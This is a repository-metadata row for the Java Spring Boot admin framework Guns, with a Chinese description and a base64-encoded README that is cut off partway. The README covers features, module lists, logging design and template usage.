",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'Guns',96391112,b'Guns\xe5\x9f\xba\xe4\xba\x8eSpringBoot 2\xef\xbc\x8c\xe8\x87\xb4\xe5\x8a\x9b\xe4\xba\x8e\xe5\x81\x9a\xe6\x9b\xb4\xe7\xae\x80\xe6\xb4\x81\xe7\x9a\x84\xe5\x90\x8e\xe5\x8f\xb0\xe7\xae\xa1\xe7\x90\x86\xe7\xb3\xbb\xe7\xbb\x9f\xef\xbc\x8c\xe5\xae\x8c\xe7\xbe\x8e\xe6\x95\xb4\xe5\x90\x88springmvc + shiro + mybatis-plus + beetl!Guns\xe9\xa1\xb9\xe7\x9b\xae\xe4\xbb\xa3\xe7\xa0\x81\xe7\xae\x80\xe6\xb4\x81\xef\xbc\x8c\xe6\xb3\xa8\xe9\x87\x8a\xe4\xb8\xb0\xe5\xaf\x8c\xef\xbc\x8c\xe4\xb8\x8a\xe6\x89\x8b\xe5\xae\xb9\xe6\x98\x93\xef\xbc\x8c\xe5\x90\x8c\xe6\x97\xb6Guns\xe5\x8c\x85\xe5\x90\xab\xe8\xae\xb8\xe5\xa4\x9a\xe5\x9f\xba\xe7\xa1\x80\xe6\xa8\xa1\xe5\x9d\x97(\xe7\x94\xa8\xe6\x88\xb7\xe7\xae\xa1\xe7\x90\x86\xef\xbc\x8c\xe8\xa7\x92\xe8\x89\xb2\xe7\xae\xa1\xe7\x90\x86\xef\xbc\x8c\xe9\x83\xa8\xe9\x97\xa8\xe7\xae\xa1\xe7\x90\x86\xef\xbc\x8c\xe5\xad\x97\xe5\x85\xb8\xe7\xae\xa1\xe7\x90\x86\xe7\xad\x8910\xe4\xb8\xaa\xe6\xa8\xa1\xe5\x9d\x97)\xef\xbc\x8c\xe5\x8f\xaf\xe4\xbb\xa5\xe7\x9b\xb4\xe6\x8e\xa5\xe4\xbd\x9c\xe4\xb8\xba\xe4\xb8\x80\xe4\xb8\xaa\xe5\x90\x8e\xe5\x8f\xb0\xe7\xae\xa1\xe7\x90\x86\xe7\xb3\xbb\xe7\xbb\x9f\xe7\x9a\x84\xe8\x84\x9a\xe6\x89\x8b\xe6\x9e\xb6!',b'Java',30,2398,,2398,False,b'https://api.github.com/repos/stylefeng/Guns/forks',"PHAgYWxpZ249ImNlbnRlciI+CiAgICA8aW1nIHNyYz0iaHR0cHM6Ly9pbWFn
ZXMuZ2l0ZWUuY29tL3VwbG9hZHMvaW1hZ2VzLzIwMTkvMDEwOS8yMTQyMThf
ZDJhYTk0OWJfNTUxMjAzLnBuZyIgd2lkdGg9IjMwMCI+CiAgICA8YnI+ICAg
ICAgCiAgICA8YnI+ICAgICAgCiAgICA8cCBhbGlnbj0iY2VudGVyIj4KICAg
ICAgICBHdW5z5Z+65LqOU3ByaW5nIEJvb3Qy77yM6Ie05Yqb5LqO5YGa5pu0
566A5rSB55qE5ZCO5Y+w566h55CG57O757uf44CC5YyF5ZCr57O757uf566h
55CG77yM5Luj56CB55Sf5oiQ77yM5aSa5pWw5o2u5bqT6YCC6YWN77yMU1NP
5Y2V54K555m75b2V77yM5bel5L2c5rWB77yM55+t5L+h77yM6YKu5Lu25Y+R
6YCB77yMT0F1dGgy55m75b2V77yM5Lu75Yqh6LCD5bqm77yM5oyB57ut6ZuG
5oiQ77yMZG9ja2Vy6YOo572y562J5Yqf44CC5pSv5oyBU3ByaW5nIENsb3Vk
IEFsaWJhYmHlvq7mnI3liqHjgILnpL7ljLrmtLvot4PvvIzniYjmnKzov63k
u6Plv6vvvIzliqDnvqTlhY3otLnmioDmnK/mlK/mjIHjgIIKICAgICAgICA8
YnI+ICAgICAgCiAgICAgICAgPGJyPiAgICAgIAogICAgICAgIDxzcGFuPgog
ICAgICAgICAgICA8c3Bhbj4KICAgICAgICAgICAgICAgIEd1bnPlrpjmlrnk
uqTmtYHnvqTvvJoyNTQ1NTAwODEo5ruhKSAgIDY4NDE2MzY2Myjmu6EpICAg
MjA3NDM0MjYwKOa7oSko5LiJ5Liq576k5bey5ruh77yM5omr5LiL5pa55LqM
57u056CB5Yqg5a6Y5pa55b6u5L+h576kKQogICAgICAgICAgICA8L3NwYW4+
CiAgICAgICAgPC9zcGFuPgogICAgICAgIDxicj4KICAgICAgICA8YnI+CiAg
ICAgICAgPGEgaHJlZj0iaHR0cHM6Ly9lYXN5d2ViLnZpcC8iPgogICAgICAg
ICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9iYWRnZS9l
YXN5d2ViLTMuMS41LWdyZWVuLnN2ZyIgYWx0PSJib290c3RyYXAiPgogICAg
ICAgIDwvYT4gCiAgICAgICAgPGEgaHJlZj0iaHR0cHM6Ly93d3cubGF5dWku
Y29tIj4KICAgICAgICAgICAgPGltZyBzcmM9Imh0dHBzOi8vaW1nLnNoaWVs
ZHMuaW8vYmFkZ2UvbGF5dWktMi41LjUtYmx1ZS5zdmciIGFsdD0iYm9vdHN0
cmFwIj4KICAgICAgICA8L2E+ICAKICAgICAgICArCiAgICAgICAgPGEgaHJl
Zj0iaHR0cDovL3NwcmluZy5pby9wcm9qZWN0cy9zcHJpbmctYm9vdCI+CiAg
ICAgICAgICAgIDxpbWcgc3JjPSJodHRwczovL2ltZy5zaGllbGRzLmlvL2Jh
ZGdlL3NwcmluZy0tYm9vdC0yLjEuNi1ncmVlbi5zdmciIGFsdD0ic3ByaW5n
LWJvb3QiPgogICAgICAgIDwvYT4KICAgICAgICA8YSBocmVmPSJodHRwOi8v
bXAuYmFvbWlkb3UuY29tIj4KICAgICAgICAgICAgPGltZyBzcmM9Imh0dHBz
Oi8vaW1nLnNoaWVsZHMuaW8vYmFkZ2UvbXliYXRpcy0tcGx1cy0zLjAtYmx1
ZS5zdmciIGFsdD0ibXliYXRpcy1wbHVzIj4KICAgICAgICA8L2E+ICAKICAg
ICAgICA8YSBocmVmPSJodHRwOi8vaWJlZXRsLmNvbS8iPgogICAgICAgICAg
ICA8aW1nIHNyYz0iaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9iYWRnZS9iZWV0
bC0yLjkuMy15ZWxsb3cuc3ZnIiBhbHQ9ImJlZXRsIj4KICAgICAgICA8L2E+
IAogICAgPC9wPgo8L3A+CgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKIyMjIOWcqOe6v2RlbW8KKiDotKbl
j7flr4bnoIHvvJphZG1pbi8xMTExMTHvvIzlnLDlnYDvvJpodHRwOi8vZGVt
by5zdHlsZWZlbmcuY24KKiDpmL/ph4zkupHlj4zljYHkuIDnibnmg6DvvIwx
QzJHIDg2L+W5tCBb54K55oiR6aKG5Y+WXShodHRwczovL3d3dy5hbGl5dW4u
Y29tLzExMTEvMjAxOS9ncm91cC1idXlpbmctc2hhcmU/cHRDb2RlPUNGQ0Y3
QTQ1QjE4MjI2M0Q0MEExNERBQUIwQjMwRUZENjQ3Qzg4Q0Y4OTZFRjUzNSZ1
c2VyQ29kZT1wNGtxejQ1ZSZzaGFyZV9zb3VyY2U9Y29weV9saW5rKQoKIyMj
IOacgOaWsOWFjei0ueaVmeeoiwpbaHR0cHM6Ly93d3cuYmlsaWJpbGkuY29t
L3ZpZGVvL2F2NTY3MTgyMDddKGh0dHBzOi8vd3d3LmJpbGliaWxpLmNvbS92
aWRlby9hdjU2NzE4MjA3KQoK6YWN5aWX6K++5Lu277yaW2h0dHBzOi8vZ2l0
ZWUuY29tL3N0eWxlZmVuZy9HdW5zLUd1aWRlXShodHRwczovL2dpdGVlLmNv
bS9zdHlsZWZlbmcvR3Vucy1HdWlkZSkKCiMjIyDmiavnoIHlhbPms6jlrpjm
lrnlhazkvJflj7flkozlrpjmlrnlvq7kv6HnvqQKPHRhYmxlPgogICAgPHRy
PgogICAgICAgIDx0ZD7lrpjmlrnlhazkvJflj7c8L3RkPgogICAgICAgIDx0
ZD48aW1nIHNyYz0iaHR0cHM6Ly9pbWFnZXMuZ2l0ZWUuY29tL3VwbG9hZHMv
aW1hZ2VzLzIwMTkvMDQxNS8xMDQ5MTFfOWJjOTI0YTVfNTUxMjAzLnBuZyIg
d2lkdGg9IjEyMCIvPjwvdGQ+CiAgICAgICAgPHRkPuaJq+eggemCgOivt+WF
pee+pDwvdGQ+CiAgICAgICAgPHRkPjxpbWcgc3JjPSJodHRwczovL2ltYWdl
cy5naXRlZS5jb20vdXBsb2Fkcy9pbWFnZXMvMjAxOS8wNDE5LzEwMzYyMl9k
NmU5ZmE1ZF81NTEyMDMucG5nIiB3aWR0aD0iMTIwIi8+PC90ZD4KICAgIDwv
dHI+CjwvdGFibGU+CgojIyMg5pyA5pawNi4w5pu05paw5YaF5a655aaC5LiL
KOabtOaWsOaXpeacnzIwMTkuMTAuMjUpCgoxLiDliY3nq6/moYbmnrbljYfn
uqdlYXN5d2ViIDMuMS4177yMbGF5dWnljYfnuqcyLjUuNeOAggoyLiDkvJjl
jJbmlbTkvZPliY3nq69VSeeVjOmdou+8jOabtOWKoOeugOa0ge+8jOWkp+aw
lOOAggozLiDmir3osaHlh7rkuIDlpZfmnYPpmZDmqKHlnovvvIzliKnnlKjm
jqXlj6Pov5vooYzmnYPpmZDmjqfliLblkozosIPnlKjop4TliJnvvIzmlrnk
vr/lnKjmnYPpmZDmjqfliLbmlrnpnaLov5vooYzmi5PlsZXjgIIKNC4g5pu/
5o2i5o6J5LqG5Lul5b6A55qEU2hpcm9LaXTvvIzph4fnlKhMb2dpbkNvbnRl
eHRIb2xkZXIuZ2V0Q29udGV4dCgpLmdldFVzZXIoKeiOt+WPluW9k+WJjeeZ
u+W9leeUqOaIt+OAggo1LiDmnYPpmZDmoYbmnrbmm7/mjaLkuLpzcHJpbmcg
c2VjdXJpdHkgKyBqd3TvvIzph4fnlKjku6TniYznmbvlvZXmlrnlvI/vvIzm
m7TliqDngbXmtLvlj6/mi5PlsZXvvIzlkIzml7bmlrnkvr/lr7nmjqXlpJrn
s7vnu59TU0/jgIIKNi4g5paw5aKe5bi46YeP5a655Zmo5qih5Z6L77yM5a+5
57O757uf5Y+Y6YeP77yM5bi46YeP77yM5Lul5Y+K55So5oi36Ieq5a6a5LmJ
55qE5LiA5Lqb5Y+C5pWw6L+b6KGM5Zyo57q/57u05oqk77yM5Zyo57q/5Yi3
5paw5Y+C5pWw5YC877yM5peg6ZyA6YeN5ZCv44CCCjcuIOezu+e7n+eahOmq
jOivgeeggeW8gOWFs++8jOmhtumDqOWvvOiIquagj+W8gOWFs++8jOezu+e7
n+m7mOiupOWvhueggeetieWcqOW4uOmHj+WuueWZqOi/m+ihjOe7tOaKpO+8
jOaegeWkp+aWueS+v+S6huezu+e7n+S9v+eUqOOAggo4LiDmiYDmnInpobXp
naLliqDovb3nmoRjc3Plkoxqc+i/m+ihjOeJiOacrOaOp+WItu+8jOW9k+WN
h+e6p+mhueebruaXtu+8jOabtOaWsOWvueW6lOeJiOacrOWPt++8jOWPr+aO
p+WItua1j+iniOWZqOWvuee8k+WtmGpz5ZKMY3Nz55qE5Yi35paw44CCCjku
IOWinuWKoOeUqOaIt+eahOiBjOWKoeeuoeeQhu+8jOWPr+WvueeUqOaIt+i/
m+ihjOiBjOWKoee7keWumuOAggoKIyMjIEd1bnPniYjmnKzor7TmmI4KCnwg
54mI5pys5ZCN56ewIHwg6K+05piOIHwg5Zyw5Z2AIHwKfCA6LS0tOiB8IDot
LS06IHwgOi0tLTogfAp8IEd1bnMgdjYuMCB8IOacgOaWsOW8gOa6kOeJiOac
rO+8jOmHh+eUqGxheXVpIHwgaHR0cHM6Ly9naXRlZS5jb20vc3R5bGVmZW5n
L2d1bnMgfAp8IEd1bnMgdjUuMSB8IEd1bnPnu4/lhbjniYjnmoTmnIDmlrDn
iYjvvIzph4fnlKhib290c3RyYXAgMyB8IGh0dHBzOi8vZ2l0ZWUuY29tL3N0
eWxlZmVuZy9ndW5zL3RyZWUvdjUuMS1maW5hbCB8CgojIyMgR3VucyDkvIHk
uJrniYgKKiDkvIHkuJrnuqfvvIzlip/og73mm7TlvLrlpKfvvIzliJvmlrDk
u6PnoIHnlJ/miJDvvIzpq5jnuqdzc2/vvIzlvq7mnI3liqHvvIzlrrnlmajl
jJbpg6jnvbLnrYnvvIzor6bmg4Xngrnlh7tbaHR0cHM6Ly93d3cuc3R5bGVm
ZW5nLmNuXShodHRwczovL3d3dy5zdHlsZWZlbmcuY24pCiog5Lmw5LyB5Lia
54mI6YCB5pyA5pawR3Vuc+aKgOacr+aWh+aho+WSjOinhumikeaVmeeoi++8
jFvngrnlh7vmn6XnnIvmioDmnK/mlofmoaNdKGh0dHBzOi8vZ2l0ZWUuY29t
L3N0eWxlZmVuZy9ndW5zL3dpa2lzL3BhZ2VzP3RpdGxlPUd1bnMlRTYlOEEl
ODAlRTYlOUMlQUYlRTYlOTYlODclRTYlQTElQTMmcGFyZW50PSnvvIxb54K5
5Ye75p+l55yL6KeG6aKR5pWZ56iLXShodHRwczovL2dpdGVlLmNvbS9zdHls
ZWZlbmcvZ3Vucy93aWtpcy9wYWdlcz90aXRsZT1HdW5zJUU4JUE3JTg2JUU5
JUEyJTkxJUU2JTk1JTk5JUU3JUE4JThCJnBhcmVudD0pCgojIyMg54mI5p2D
5aOw5piOCkd1bnPph4fnlKhMR1BMLTMuMOW8gOa6kOWNj+iurgoKIyMjIEd1
bnPliY3nq6/mqKHmnb8KKiBHdW5z5pyA5paw5peX6Iiw54mI77yM5omA55So
5YmN56uv5qih5p2/5Li6RWFzeVdlYuWQjuWPsOW8gOWPkeahhuaetizlrpjn
vZHlnLDlnYDkuLrvvJpbaHR0cHM6Ly9lYXN5d2ViLnZpcC9dKGh0dHBzOi8v
ZWFzeXdlYi52aXAvKe+8jOS9v+eUqOaXtuW3suW+geaxguS9nOiAheWFgeiu
uOOAggoKIyMjIOeuoeeQhuezu+e7n+WKn+iDvQoxLueUqOaIt+euoeeQhiAy
LuinkuiJsueuoeeQhiAzLumDqOmXqOeuoeeQhiA0LuiPnOWNleeuoeeQhiA1
LuWtl+WFuOeuoeeQhiA2LuS4muWKoeaXpeW/lyA3LueZu+W9leaXpeW/lyA4
LuebkeaOp+euoeeQhiA5LumAmuefpeeuoeeQhiAxMC7ogYzliqHnrqHnkIYg
MTEu5Luj56CB55Sf5oiQIDEyLuWcqOe6v+WPguaVsOmFjee9rgoKIyMjIOmh
ueebrueJueeCuQoxLiDln7rkuo5TcHJpbmdCb29077yM566A5YyW5LqG5aSn
6YeP6aG555uu6YWN572u5ZKMbWF2ZW7kvp3otZbvvIzorqnmgqjmm7TkuJPm
s6jkuo7kuJrliqHlvIDlj5HvvIzni6znibnnmoTliIbljIXmlrnlvI/vvIzk
u6PnoIHlpJrogIzkuI3kubHjgIIKMi4g5a6M5ZaE55qE5pel5b+X6K6w5b2V
5L2T57O777yM5Y+v6K6w5b2V55m75b2V5pel5b+X77yM5Lia5Yqh5pON5L2c
5pel5b+XKOWPr+iusOW9leaTjeS9nOWJjeWSjOaTjeS9nOWQjueahOaVsOaN
rinvvIzlvILluLjml6Xlv5fliLDmlbDmja7lupPvvIzpgJrov4dAQnVzc2lu
ZXNzTG9n5rOo6Kej5ZKMTG9nT2JqZWN0SG9sZGVyLm1lKCkuc2V0KCnmlrnm
s5XvvIzkuJrliqHmk43kvZzml6Xlv5flj6/lhbfkvZPorrDlvZXlk6rkuKrn
lKjmiLfvvIzmiafooYzkuoblk6rkupvkuJrliqHvvIzkv67mlLnkuoblk6rk
upvmlbDmja7vvIzlubbkuJTml6Xlv5forrDlvZXkuLrlvILmraXmiafooYzv
vIzor6bmg4Xor7fop4FAQnVzc2luZXNzTG9n5rOo6Kej5ZKMTG9nT2JqZWN0
SG9sZGVy77yMTG9nTWFuYWdlcu+8jExvZ0FvcOexu+OAggozLiDliKnnlKhi
ZWV0bOaooeadv+W8leaTjuWvueWJjeWPsOmhtemdoui/m+ihjOWwgeijheWS
jOaLhuWIhu+8jOS9v+iHg+iCv+eahGh0bWzku6PnoIHlj5jlvpfnroDmtIHv
vIzmm7TliqDmmJPnu7TmiqTjgIIKNC4g5a+55bi455SoanPmj5Lku7bov5vo
oYzkuozmrKHlsIHoo4XvvIzkvb9qc+S7o+eggeWPmOW+l+eugOa0ge+8jOab
tOWKoOaYk+e7tOaKpOOAggo1LiBjb250cm9sbGVy5bGC6YeH55SobWFwICsg
d2FycHBlcuaWueW8j+eahOi/lOWbnue7k+aenO+8jOi/lOWbnue7meWJjeer
r+abtOS4uueBtea0u+eahOaVsOaNru+8jOWFt+S9k+WPguingWNvbS5zdHls
ZWZlbmcuZ3Vucy5tb2R1bGFyLnN5c3RlbS53YXJwcGVy5YyF5Lit5YW35L2T
57G744CCCjYuIOmYsuatolhTU+aUu+WHu++8jOmAmui/h1hzc0ZpbHRlcuex
u+WvueaJgOacieeahOi+k+WFpeeahOmdnuazleWtl+espuS4sui/m+ihjOi/
h+a7pOS7peWPiuabv+aNouOAggo3LiDnroDljZXlj6/nlKjnmoTku6PnoIHn
lJ/miJDkvZPns7vvvIzpgJrov4dTaW1wbGVUZW1wbGF0ZUVuZ2luZeWPr+eU
n+aIkOW4puacieS4u+mhtei3s+i9rOWSjOWinuWIoOaUueafpeeahOmAmueU
qOaOp+WItuWZqOOAgWh0bWzpobXpnaLku6Xlj4rnm7jlhbPnmoRqc++8jOi/
mOWPr+S7peeUn+aIkFNlcnZpY2XlkoxEYW/vvIzlubbkuJTov5nkupvnlJ/m
iJDpobnpg73kuLrlj6/pgInnmoTvvIzpgJrov4dDb250ZXh0Q29uZmln5LiL
55qE5LiA5Lqb5YiXeHh4U3dpdGNo5byA5YWz77yM5Y+v54G15rS75o6n5Yi2
55Sf5oiQ5qih5p2/5Luj56CB77yM6K6p5oKo5oqK5pe26Ze05pS+5Zyo55yf
5q2j55qE5Lia5Yqh5LiK44CCCjguIOaOp+WItuWZqOWxgue7n+S4gOeahOW8
guW4uOaLpuaIquacuuWItu+8jOWIqeeUqEBDb250cm9sbGVyQWR2aWNl57uf
5LiA5a+55byC5bi45oum5oiq77yM5YW35L2T6KeBY29tLnN0eWxlZmVuZy5n
dW5zLmNvcmUuYW9wLkdsb2JhbEV4Y2VwdGlvbkhhbmRsZXLnsbvjgIIKOS4g
6aG16Z2i57uf5LiA55qEanMga2V5LXZhbHVl5Y2V5L6L5qih5byP5YaZ5rOV
77yM5q+P5Liq6aG16Z2i55Sf5oiQ5LiA5Liq5ZSv5LiA55qE5YWo5bGA5Y+Y
6YeP77yM5o+Q6auYanPnmoTliKnnlKjmlYjnjofvvIzlubbkuJTmnInmlYjp
mLLmraLlpJrkuKrkurrlkZjlvIDlj5HlvJXotbfnmoTlh73mlbDlkI0v57G7
5ZCN5Yay56qB77yM5bm25LiU5Y+v5Lul5pu05aW95Zyw5Y6757u05oqk5Luj
56CB44CCCjEwLiDlnKjnur/ns7vnu5/lj4LmlbDphY3nva7vvIzngbXmtLvm
jqfliLbluLjnlKjlip/og73nmoTlvIDlhbPvvIzml6DpnIDph43lkK/pobnn
m67ljbPlj6/nlJ/mlYjvvIzlrp7ml7bliLfmlrDjgIIKCiMjIyDkuJrliqHm
l6Xlv5forrDlvZUK5pel5b+X6K6w5b2V6YeH55SoYW9wKExvZ0FvcOexuynm
lrnlvI/lr7nmiYDmnInljIXlkKtAQnVzc2luZXNzTG9n5rOo6Kej55qE5pa5
5rOV6L+b6KGMYW9w5YiH5YWl77yM5Lya6K6w5b2V5LiL5b2T5YmN55So5oi3
5omn6KGM5LqG5ZOq5Lqb5pON5L2c77yI5Y2zQEJ1c3NpbmVzc0xvZyB2YWx1
ZeWxnuaAp+eahOWGheWuue+8ie+8jOWmguaenOa2ieWPiuWIsOaVsOaNruS/
ruaUue+8jOS8muWPluW9k+WJjWh0dHDor7fmsYLnmoTmiYDmnIlyZXF1ZXN0
UGFyYW1ldGVyc+S4jkxvZ09iamVjdEhvbGRlcuexu+S4ree8k+WtmOeahE9i
amVjdOWvueixoeeahOaJgOacieWtl+auteS9nOavlOi+g++8iOaJgOS7peWc
qOe8lui+keS5i+WJjeeahOiOt+WPluivpuaDheaOpeWPo+S4remcgOimgee8
k+WtmOiiq+S/ruaUueWvueixoeS5i+WJjeeahOWtl+auteS/oeaBr++8ie+8
jOaXpeW/l+WGheWuueS8muW8guatpeWtmOWFpeaVsOaNruW6k+S4re+8iOmA
mui/h1NjaGVkdWxlZFRocmVhZFBvb2xFeGVjdXRvcuexu++8ieOAggoKIyMj
IGJlZXRs5a+55YmN5Y+w6aG16Z2i55qE5ouG5YiG5LiO5YyF6KOFCuS+i+Wm
gu+8jOaKiuS4u+mhteaLhuWIhuaIkOS4iemDqOWIhu+8jOavj+S4qumDqOWI
huWNleeLrOS4gOS4qumhtemdou+8jOabtOWKoOS+v+S6jue7tOaKpApgYGAK
PCEtLeW3puS+p+WvvOiIquW8gOWniy0tPgogICAgQGluY2x1ZGUoIi9jb21t
b24vX3RhYi5odG1sIil7fQo8IS0t5bem5L6n5a+86Iiq57uT5p2fLS0+Cgo8
IS0t5Y+z5L6n6YOo5YiG5byA5aeLLS0+CiAgICBAaW5jbHVkZSgiL2NvbW1v
bi9fcmlnaHQuaHRtbCIpe30KPCEtLeWPs+S+p+mDqOWIhue7k+adny0tPgoK
PCEtLeWPs+S+p+i+ueagj+W8gOWniy0tPgogICAgQGluY2x1ZGUoIi9jb21t
b24vX3RoZW1lLmh0bWwiKXt9CjwhLS3lj7PkvqfovrnmoI/nu5PmnZ8tLT4K
YGBgCuS7peWPiuWvuemHjeWkjeeahGh0bWzov5vooYzljIXoo4XvvIzkvb/l
iY3nq6/pobXpnaLmm7TliqDkuJPms6jkuo7kuJrliqHlrp7njrDvvIzkvovl
poLvvIzmiormiYDmnInpobXpnaLlvJXnlKjljIXov5vooYzmj5Dlj5YKYGBg
CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CjxtZXRhIGNoYXJzZXQ9
InV0Zi04Ij4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRo
PWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgo8bWV0YSBuYW1l
PSJyZW5kZXJlciIgY29udGVudD0id2Via2l0IiAvPjwhLS0g6K6pMzYw5rWP
6KeI5Zmo6buY6K6k6YCJ5oupd2Via2l05YaF5qC4IC0tPgoKPCEtLSDlhajl
sYBjc3MgLS0+CjxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgaHJlZj0iJHtj
dHhQYXRofS9zdGF0aWMvZmF2aWNvbi5pY28iPgo8IS0tIOWFqOWxgGpzIC0t
Pgo8c2NyaXB0IHNyYz0iJHtjdHhQYXRofS9zdGF0aWMvanMvanF1ZXJ5Lm1p
bi5qcz92PTIuMS40Ij48L3NjcmlwdD4KPGJvZHkgY2xhc3M9ImdyYXktYmci
PgoJPGRpdiBjbGFzcz0id3JhcHBlciB3cmFwcGVyLWNvbnRlbnQiPgoJCSR7
bGF5b3V0Q29udGVudH0KCTwvZGl2PgoJPHNjcmlwdCBzcmM9IiR7Y3R4UGF0
aH0vc3RhdGljL2pzL2NvbnRlbnQuanM/dj0xLjAuMCI+PC9zY3JpcHQ+Cjwv
Ym9keT4KPC9odG1sPgpgYGAK5byA5Y+R6aG16Z2i5pe277yM5Y+q6ZyA57yW
5YaZ5aaC5LiL5Luj56CB5Y2z5Y+vCmBgYApAbGF5b3V0KCIvY29tbW9uL19j
b250YWluZXIuaHRtbCIpewo8ZGl2IGNsYXNzPSJyb3ciPgogICAgPGRpdiBj
bGFzcz0iY29sLXNtLTEyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpYm94IGZs
b2F0LWUtbWFyZ2lucyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9Imlib3gt
dGl0bGUiPgogICAgICAgICAgICAgICAgPGg1PumDqOmXqOeuoeeQhjwvaDU+
CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJp
Ym94LWNvbnRlbnQiPgogICAgICAgICAgICAgICAvL+iHquWumuS5ieWGheWu
uQogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2
Pgo8L2Rpdj4KPHNjcmlwdCBzcmM9IiR7Y3R4UGF0aH0vc3RhdGljL21vZHVs
YXIvc3lzdGVtL2RlcHQvZGVwdC5qcyI+PC9zY3JpcHQ+CkB9CmBgYArku6Xk
uIpiZWV0bOeahOeUqOazleivt+WPguiAg2JlZXRs6K+05piO5paH5qGj44CC
CgojIyMg5a+5anPluLjnlKjku6PnoIHnmoTlsIHoo4UK5Zyod2ViYXBwL3N0
YXRpYy9qcy9jb21tb27nm67lvZXkuK3vvIzmnInlr7nluLjnlKhqc+S7o+eg
geeahOWwgeijhe+8jOS+i+WmgkZlbmcuanPvvIzlhbbkuK1GZW5nLmluZm8o
Ke+8jEZlbmcuc3VjY2Vzcygp77yMRmVuZy5lcnJvcigp5LiJ5Liq5pa55rOV
77yM5YiG5Yir5bCB6KOF5LqG5pmu6YCa5o+Q56S677yM5oiQ5Yqf5o+Q56S6
77yM6ZSZ6K+v5o+Q56S655qE5Luj56CB77yM566A5YyW5LqGbGF5ZXLmj5Dn
pLrlsYLmj5Lku7bnmoTkvb/nlKjjgIIKCiMjIyDmnoHnroDnmoTlm77niYfk
uIrkvKDmlrnms5UKZ3Vuc+WvuXdlYi11cGxvYWTov5vooYzkuozmrKHlsIHo
o4XvvIzorqnlm77niYfnmoTkuIrkvKDlip/og73lkaLlj6rnlKgy6KGM5Luj
56CB5Y2z5Y+v5a6e546w77yM5aaC5LiLCmBgYAp2YXIgYXZhdGFyVXAgPSBu
ZXcgJFdlYlVwbG9hZCgiYXZhdGFyIik7CmF2YXRhclVwLmluaXQoKTsKYGBg
CuWFt+S9k+WunueOsOivt+WPguiAg3N0YXRpYy9qcy9jb21tb24vd2ViLXVw
bG9hZC1vYmplY3QuanMKCiMjIyDni6zliJtjb250cm9sbGVy5bGC77yMbWFw
K3dhcnBwZXLov5Tlm57mlrnlvI8KbWFwK3dhcnBwZXLmlrnlvI/ljbPkuLrm
iopjb250cm9sbGVy5bGC55qE6L+U5Zue57uT5p6c5L2/55SoQmVhbktpdOW3
peWFt+exu+aKiuWOn+aciWJlYW7ovazljJbkuLpNYXDnmoTnmoTlvaLlvI8o
5oiW6ICF5Y6f5pyJYmVhbuebtOaOpeaYr21hcOeahOW9ouW8jynvvIzlho3n
lKjljZXni6zlhpnnmoTkuIDkuKrljIXoo4Xnsbvlho3ljIXoo4XkuIDmrKHo
v5nkuKptYXDvvIzkvb/ph4zpnaLnmoTlj4LmlbDmm7TliqDlhbfkvZPvvIzm
m7TliqDmnInlkKvkuYnvvIzkuIvpnaLkuL7kuIDkuKrkvovlrZDvvIzkvovl
poLvvIzlnKjov5Tlm57nu5nliY3lj7DkuIDkuKrmgKfliKvml7bvvIzmlbDm
ja7lupPmn6Xlh7rmnaUx5piv55S3MuaYr+Wls++8jOWBh+WmguebtOaOpei/
lOWbnue7meWJjeWPsO+8jOmCo+S5iOWJjeWPsOaYvuekuueahOaXtuWAmei/
mOmcgOimgeWinuWKoOS4gOasoeWIpOaWre+8jOW5tuS4lOWJjeWQjuerr+WI
huemu+W8gOWPkeaXtuWPiOWinuWKoOS6huS4gOasoeS6pOa1geWSjOaWh+ah
o+eahOaIkOacrO+8jOS9huaYr+mHh+eUqHdhcnBwZXLljIXoo4XnmoTlvaLl
vI/vvIzlj6/ku6Xnm7TmjqXmiorov5Tlm57nu5PmnpzljIXoo4XkuIDkuIvv
vIzkvovlpoLliqjmgIHlop7liqDkuIDkuKrlrZfmrrVzZXhOYW1l55u05o6l
6L+U5Zue57uZ5YmN5Y+w5oCn5Yir55qE5Lit5paH5ZCN56ew5Y2z5Y+v44CC
CgojIyMg54us5YibbXliYXRpc+aVsOaNruiMg+WbtOaLpuaIquWZqO+8jOWu
nueOsOWvueaVsOaNruadg+mZkOeahOi/h+a7pApHdW5z55qE5pWw5o2u6IyD
5Zu05o6n5Yi25piv5oyH77yM5a+55oul5pyJ55u45ZCM6KeS6Imy55qE55So
5oi377yM5qC55o2u6YOo6Zeo55qE5LiN5ZCM6L+b6KGM55u45bqU55qE5pWw
5o2u562b6YCJ77yM5aaC5p6c6YOo6Zeo5LiN55u45ZCM77yM6YKj5LmI5pyJ
5Y+v6IO95bGV56S65Ye655qE5YW35L2T5pWw5o2u5piv5LiN5LiA6Ie055qE
LuaJgOS7peivtEd1bnPlr7nmlbDmja7ojIPlm7TmjqfliLbmmK/ku6Xpg6jp
l6hpZOS4uuWNleS9jeadpeagh+ivhueahO+8jOWmguS9leWinuWKoOaVsOaN
ruiMg+WbtOaLpuaIquWRoj/lj6rpnIDlnKjnm7jlhbPnmoRtYXBwZXLmjqXl
j6PnmoTlj4LmlbDkuK3lop7liqDkuIDkuKpEYXRhU2NvcGXlr7nosaHljbPl
j6/vvIxEYXRhU2NvcGXkuK3mnInkuKTkuKrlrZfmrrXvvIxzY29wZU5hbWXn
lKjmnaXmoIfor4ZzcWzor63lj6XkuK3pg6jpl6hpZOeahOWtl+auteWQjeen
